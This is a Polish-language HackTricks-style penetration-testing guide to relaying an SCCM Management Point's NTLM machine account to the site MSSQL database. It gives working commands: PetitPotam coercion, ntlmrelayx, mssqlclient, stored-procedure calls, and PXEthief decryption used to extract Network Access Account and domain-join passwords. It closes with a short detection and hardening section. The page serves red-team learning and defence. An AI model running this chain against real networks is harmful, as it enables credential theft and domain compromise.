# SCCM Management Point NTLM Relay do SQL – Ekstrakcja sekretów polityki OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Wymuszając **System Center Configuration Manager (SCCM) Management Point (MP)** do uwierzytelnienia przez SMB/RPC i **przekazując** ten NTLM machine account do **bazy danych serwisu (MSSQL)**, uzyskujesz prawa `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Te role pozwalają na wywołanie zestawu procedur składowanych, które ujawniają **Operating System Deployment (OSD)** policy blobs (poświadczenia Network Access Account, zmienne Task-Sequence itp.). Bloby są zakodowane/encrypted w formacie hex, ale mogą być dekodowane i odszyfrowane za pomocą **PXEthief**, co daje jawne sekrety.

Ogólny schemat:
1. Odkryj MP & bazę danych serwisu ↦ nieautoryzowany punkt końcowy HTTP `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Uruchom `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Wymuś MP używając **PetitPotam**, PrinterBug, DFSCoerce itp.
4. Przez proxy SOCKS połącz się z `mssqlclient.py -windows-auth` jako przekazywane konto **<DOMAIN>\\<MP-host>$**.
5. Wykonaj:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (lub `MP_GetPolicyBodyAfterAuthorization`)
6. Usuń `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Sekrety takie jak `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` itp. są odzyskiwane bez dotykania PXE lub klientów.

---

## 1. Enumerowanie nieautoryzowanych punktów końcowych MP
Rozszerzenie ISAPI MP **GetAuth.dll** ujawnia kilka parametrów, które nie wymagają uwierzytelnienia (chyba że serwis jest tylko PKI):

| Parametr | Cel |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Zwraca publiczny klucz certyfikatu podpisującego serwis + GUIDy urządzeń *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Wymienia każdy Management-Point w serwisie. |
| `SITESIGNCERT` | Zwraca certyfikat podpisujący Primary-Site (identyfikuje serwer serwisu bez LDAP). |

Zbierz GUIDy, które będą działać jako **clientID** do późniejszych zapytań DB:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Przekaż konto maszyny MP do MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Kiedy przymus się uruchomi, powinieneś zobaczyć coś takiego:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Zidentyfikuj polityki OSD za pomocą procedur składowanych
Połącz się przez proxy SOCKS (port 1080 domyślnie):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Przełącz się na bazę danych **CM_<SiteCode>** (użyj 3-cyfrowego kodu lokalizacji, np. `CM_001`).

### 3.1  Znajdź GUIDy nieznanych komputerów (opcjonalnie)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lista przypisanych polityk
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Każdy wiersz zawiera `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Skup się na politykach:
* **NAAConfig**  – poświadczenia konta dostępu do sieci
* **TS_Sequence** – zmienne sekwencji zadań (OSDJoinAccount/Password)
* **CollectionSettings** – może zawierać konta uruchamiane jako

### 3.3  Pobierz pełne body
Jeśli już masz `PolicyID` i `PolicyVersion`, możesz pominąć wymaganie clientID, używając:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> WAŻNE: W SSMS zwiększ „Maksymalną liczbę pobranych znaków” (>65535), w przeciwnym razie blob zostanie obcięty.

---

## 4. Zdekoduj i odszyfruj blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Przykład odzyskanych sekretów:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Istotne role i procedury SQL
Po relacji logowanie jest mapowane na:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Te role ujawniają dziesiątki uprawnień EXEC, kluczowe używane w tym ataku to:

| Procedura składowana | Cel |
|----------------------|-----|
| `MP_GetMachinePolicyAssignments` | Lista polityk zastosowanych do `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Zwraca pełne ciało polityki. |
| `MP_GetListOfMPsInSiteOSD` | Zwracane przez ścieżkę `MPKEYINFORMATIONMEDIA`. |

Możesz sprawdzić pełną listę za pomocą:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Wykrywanie i Wzmacnianie
1. **Monitoruj logowania MP** – każde konto komputera MP logujące się z IP, które nie jest jego hostem ≈ relay.
2. Włącz **Rozszerzoną Ochronę dla Uwierzytelniania (EPA)** w bazie danych witryny (`PREVENT-14`).
3. Wyłącz nieużywany NTLM, wymuś podpisywanie SMB, ogranicz RPC (
te same środki zaradcze stosowane przeciwko `PetitPotam`/`PrinterBug`).
4. Wzmocnij komunikację MP ↔ DB za pomocą IPSec / mutual-TLS.

---

## Zobacz także
* Podstawy relaying NTLM:
{{#ref}}
../ntlm/README.md
{{#endref}}

* Nadużycia MSSQL i post-exploitation:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Odniesienia
- [Chciałbym porozmawiać z Twoim menedżerem: Kradzież sekretów za pomocą relayów punktów zarządzania](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Menadżer Niewłaściwej Konfiguracji – ELEVATE-4 i ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
